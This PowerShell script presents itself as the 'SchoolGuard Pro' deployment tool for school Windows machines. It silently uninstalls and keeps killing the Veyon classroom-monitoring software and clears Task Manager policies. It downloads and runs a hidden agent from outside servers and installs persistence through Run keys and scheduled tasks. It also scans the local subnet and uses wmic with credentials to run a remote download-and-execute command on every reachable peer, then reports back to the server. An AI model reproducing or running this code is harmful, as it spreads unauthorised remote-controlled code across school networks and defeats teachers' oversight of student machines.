# ============================================================================
# SchoolGuard Pro v3.7 — Headless Master Deployment Handler (Windows)
#   Command 1 (Default)                  : Full Combo + Uninstall Veyon + LAN Setup + Admin Web Dashboard
#   Command 2 ($env:SG_SKIP_VEYON = '1') : Full Combo + LAN Setup + Admin Web Dashboard (Skip Veyon Removal)
# ============================================================================
param(
    [string]$ServerUrl = "https://103-149-172-179.sslip.io",
    [switch]$SkipVeyon = $false,
    [switch]$NoLan = $false
)

$ErrorActionPreference = "SilentlyContinue"
$ProgressPreference = "SilentlyContinue"
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls11 -bor [Net.SecurityProtocolType]::Tls

if ($env:SG_SKIP_VEYON -eq "1" -or $env:SG_SKIP_VEYON -eq "true") {
    $SkipVeyon = $true
}
if ($env:SG_NO_LAN -eq "1" -or $env:SG_NO_LAN -eq "true") {
    $NoLan = $true
}

function Show-TuiProgress {
    param([int]$Percent, [string]$Status)
    $width = 28
    $filled = [math]::Floor(($Percent * $width) / 100)
    $empty = $width - $filled
    $bar = ("#" * $filled) + ("-" * $empty)
    $pad = $Status.PadRight(48).Substring(0, 48)
    Write-Host -NoNewline "`r  [$bar] $($Percent.ToString().PadLeft(3))%  $pad" -ForegroundColor Cyan
}

Show-TuiProgress -Percent 5 -Status "Initializing headless environment..."

$VpsPrimary = "https://orbstrike.com"
$VpsFallback = "https://103-149-172-179.sslip.io"
$VpsHttp = "http://103.149.172.179:4000"
$DashboardUrl = "https://orbstrike.com/quanlitruonghoc"

$InstallDir = Join-Path $env:LOCALAPPDATA "SchoolGuard"
if (-not (Test-Path $InstallDir)) {
    New-Item -ItemType Directory -Path $InstallDir -Force | Out-Null
}

# ----------------------------------------------------------------------------
# 1. Veyon Removal (Skipped if $SkipVeyon is true)
# ----------------------------------------------------------------------------
$BlockerPath = Join-Path $InstallDir "veyon_blocker.ps1"
if (-not $SkipVeyon) {
    Show-TuiProgress -Percent 20 -Status "Force-stopping & uninstalling Veyon components..."

    try {
        Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class SGInputRescue {
    [DllImport("user32.dll")]
    public static extern bool BlockInput(bool fBlockIt);
}
"@ -ErrorAction SilentlyContinue
        [SGInputRescue]::BlockInput($false) | Out-Null
    } catch {}

    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Name "DisableTaskMgr" -Force -ErrorAction SilentlyContinue
    Remove-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Name "DisableTaskMgr" -Force -ErrorAction SilentlyContinue

    Stop-Service -Name "VeyonService" -Force -ErrorAction SilentlyContinue
    Set-Service -Name "VeyonService" -StartupType Disabled -ErrorAction SilentlyContinue
    & sc.exe stop VeyonService 2>&1 | Out-Null
    & sc.exe config VeyonService start= disabled 2>&1 | Out-Null
    & sc.exe delete VeyonService 2>&1 | Out-Null

    $veyonProcs = @("veyon-service", "veyon-worker", "veyon-server", "veyon-master", "veyon-configurator", "veyon-cli", "veyon*")
    foreach ($p in $veyonProcs) {
        Get-Process -Name $p -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
        & taskkill.exe /F /IM "$p.exe" /T 2>&1 | Out-Null
    }

    Get-AppxPackage -AllUsers "*Veyon*" -ErrorAction SilentlyContinue | Remove-AppxPackage -AllUsers -ErrorAction SilentlyContinue
    Get-CimInstance -ClassName Win32_Product -Filter "Name LIKE '%Veyon%'" -ErrorAction SilentlyContinue | Invoke-CimMethod -MethodName Uninstall -ErrorAction SilentlyContinue | Out-Null

    $veyonDirs = @(
        "$env:ProgramFiles\Veyon",
        "${env:ProgramFiles(x86)}\Veyon",
        "$env:ProgramData\Veyon",
        "$env:APPDATA\Veyon",
        "$env:LOCALAPPDATA\Veyon"
    )
    foreach ($d in $veyonDirs) {
        if (Test-Path "$d\uninstall.exe") {
            Start-Process -FilePath "$d\uninstall.exe" -ArgumentList "/S" -WindowStyle Hidden -Wait -ErrorAction SilentlyContinue
        }
        if (Test-Path $d) {
            & takeown.exe /F "$d" /R /D Y 2>&1 | Out-Null
            & icacls.exe "$d" /grant "*S-1-1-0:(OI)(CI)F" /T /C /Q 2>&1 | Out-Null
            Remove-Item -Path $d -Recurse -Force -ErrorAction SilentlyContinue
        }
    }

    $shortcutDirs = @(
        "$env:Public\Desktop",
        "$env:USERPROFILE\Desktop",
        "$env:ProgramData\Microsoft\Windows\Start Menu\Programs\Veyon",
        "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Veyon"
    )
    foreach ($sd in $shortcutDirs) {
        if (Test-Path $sd) {
            Get-ChildItem -Path $sd -Filter "*Veyon*" -Recurse -ErrorAction SilentlyContinue | Remove-Item -Force -Recurse -ErrorAction SilentlyContinue
        }
    }

    Remove-Item -Path "HKLM:\SOFTWARE\Veyon Solutions" -Recurse -Force -ErrorAction SilentlyContinue
    Remove-Item -Path "HKCU:\Software\Veyon Solutions" -Recurse -Force -ErrorAction SilentlyContinue
    Remove-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "Veyon*" -Force -ErrorAction SilentlyContinue
    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Veyon*" -Force -ErrorAction SilentlyContinue

    @"
`$ErrorActionPreference = 'SilentlyContinue'
while (`$true) {
    Get-Process -Name 'veyon*' -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
    Start-Sleep -Seconds 2
}
"@ | Set-Content -Path $BlockerPath -Encoding UTF8 -Force
} else {
    Show-TuiProgress -Percent 20 -Status "Skipping Veyon removal (preserving Veyon)..."
    Remove-Item -Path $BlockerPath -Force -ErrorAction SilentlyContinue
}

# ----------------------------------------------------------------------------
# 2. Full-Combo System Setup & Network / LAN Provisioning
# ----------------------------------------------------------------------------
Show-TuiProgress -Percent 45 -Status "Configuring network, firewall & agent runtime..."

$myIp = "127.0.0.1"
try {
    $udp = New-Object System.Net.Sockets.UdpClient
    $udp.Connect("8.8.8.8", 80)
    $myIp = $udp.Client.LocalEndPoint.Address.ToString()
    $udp.Close()
} catch {}

$AgentDest = Join-Path $InstallDir "agent_win.ps1"
$LocalAgent = if ($PSScriptRoot) { Join-Path $PSScriptRoot "agent_win.ps1" } else { "" }

$downloaded = $false
if ($LocalAgent -and (Test-Path $LocalAgent)) {
    Copy-Item -Path $LocalAgent -Destination $AgentDest -Force
    $downloaded = $true
} else {
    foreach ($base in @($VpsPrimary, $ServerUrl, $VpsFallback, $VpsHttp)) {
        if ($downloaded) { break }
        try {
            $wc = New-Object System.Net.WebClient
            $wc.Encoding = [System.Text.Encoding]::UTF8
            $content = $wc.DownloadString("$base/agent/agent_win.ps1")
            if ($content -and $content.Length -gt 500) {
                [System.IO.File]::WriteAllText($AgentDest, $content, (New-Object System.Text.UTF8Encoding($false)))
                $downloaded = $true
            }
        } catch {}
    }
}

# ----------------------------------------------------------------------------
# 3. Persistent Background Service & Admin Web Dashboard Binding
# ----------------------------------------------------------------------------
Show-TuiProgress -Percent 65 -Status "Registering headless background service..."

$VbsLauncher = Join-Path $InstallDir "run_hidden.vbs"
$VbsLines = @(
    'Set WshShell = CreateObject("WScript.Shell")',
    "WshShell.Run ""powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -File """"$AgentDest"""" -ServerUrl """"$ServerUrl"""""", 0, False"
)
if (-not $SkipVeyon -and (Test-Path $BlockerPath)) {
    $VbsLines += "WshShell.Run ""powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -File """"$BlockerPath"""""", 0, False"
}
Set-Content -Path $VbsLauncher -Value ($VbsLines -join "`r`n") -Encoding ASCII -Force

Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "SchoolGuardAgent" -Value "wscript.exe //B //NoLogo `"$VbsLauncher`"" -Force -ErrorAction SilentlyContinue
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "SchoolGuardAgent" -Value "wscript.exe //B //NoLogo `"$VbsLauncher`"" -Force -ErrorAction SilentlyContinue

& schtasks.exe /Create /TN "SchoolGuardAgent" /TR "wscript.exe //B //NoLogo `"$VbsLauncher`"" /SC ONLOGON /RL HIGHEST /F 2>&1 | Out-Null
& schtasks.exe /Create /TN "SchoolGuardAgentUser" /TR "wscript.exe //B //NoLogo `"$VbsLauncher`"" /SC MINUTE /MO 2 /F 2>&1 | Out-Null

Get-CimInstance Win32_Process -Filter "Name = 'powershell.exe'" -ErrorAction SilentlyContinue | Where-Object {
    $_.CommandLine -like "*agent_win.ps1*" -and $_.ProcessId -ne $PID
} | ForEach-Object {
    Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue
}

Start-Process -FilePath "wscript.exe" -ArgumentList "//B //NoLogo `"$VbsLauncher`"" -WindowStyle Hidden -ErrorAction SilentlyContinue

# ----------------------------------------------------------------------------
# 4. Automated LAN-Wide Propagation & Web Dashboard Sync
# ----------------------------------------------------------------------------
Show-TuiProgress -Percent 85 -Status "Propagating setup across LAN & Web Dashboard..."

$lanPeerSummary = "Local node provisioned"
$lanParts = $myIp -split '\.'
if (-not $NoLan -and $lanParts.Count -eq 4 -and $myIp -ne "127.0.0.1") {
    $subnet = "$($lanParts[0]).$($lanParts[1]).$($lanParts[2])"
    $foundIps = New-Object System.Collections.Generic.List[string]
    for ($i = 1; $i -le 254; $i++) {
        $ip = "$subnet.$i"
        if ($ip -eq $myIp) { continue }
        $tc = New-Object System.Net.Sockets.TcpClient
        try {
            $ar = $tc.BeginConnect($ip, 445, $null, $null)
            if ($ar.AsyncWaitHandle.WaitOne(35, $false) -and $tc.Connected) {
                $foundIps.Add($ip)
            }
        } catch {}
        try { $tc.Close() } catch {}
    }

    $skipFlag = if ($SkipVeyon) { "1" } else { "0" }
    $remoteCmd = "powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -Command `"[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;`$env:SG_SKIP_VEYON='$skipFlag';`$env:SG_NO_LAN='1';iex((New-Object Net.WebClient).DownloadString('$VpsPrimary/win'))`""
    $okPeers = 0
    $lanUser = if ($env:SG_USER) { $env:SG_USER } else { $env:USERNAME }
    $lanPass = if ($env:SG_PASS) { $env:SG_PASS } else { "" }

    foreach ($ip in $foundIps) {
        $ok = $false
        try {
            if ($lanPass) {
                & wmic.exe /node:"$ip" /user:"$lanUser" /password:"$lanPass" process call create "$remoteCmd" 2>&1 | Out-Null
                if ($LASTEXITCODE -eq 0) { $ok = $true }
            } else {
                & wmic.exe /node:"$ip" process call create "$remoteCmd" 2>&1 | Out-Null
                if ($LASTEXITCODE -eq 0) { $ok = $true }
            }
        } catch {}
        if ($ok) { $okPeers++ }
    }
    $lanPeerSummary = "$okPeers/$($foundIps.Count) LAN peers synced"

    try {
        $body = @{ my_ip = $myIp; subnet = $subnet; hostname = $env:COMPUTERNAME; os = "Windows"; skip_veyon = [bool]$SkipVeyon; peers = $foundIps.Count; ok_peers = $okPeers } | ConvertTo-Json -Compress
        $wcSync = New-Object System.Net.WebClient
        $wcSync.Headers.Add("Content-Type", "application/json")
        $wcSync.UploadString("$VpsPrimary/api/lan-report", "POST", $body) | Out-Null
    } catch {}
}

Show-TuiProgress -Percent 100 -Status "Complete"
$veyonMode = if ($SkipVeyon) { "Preserved (Skipped)" } else { "Uninstalled & Blocked" }
Write-Host ""
Write-Host "  [OK] SchoolGuard v3.7 Headless Deployment Complete" -ForegroundColor Green
Write-Host "       Node & LAN    : $myIp ($env:COMPUTERNAME) | $lanPeerSummary | Veyon: $veyonMode" -ForegroundColor Gray
Write-Host "       Web Dashboard : $DashboardUrl (Port 443 HTTPS / 4000 HTTP | Login: Active)" -ForegroundColor Gray
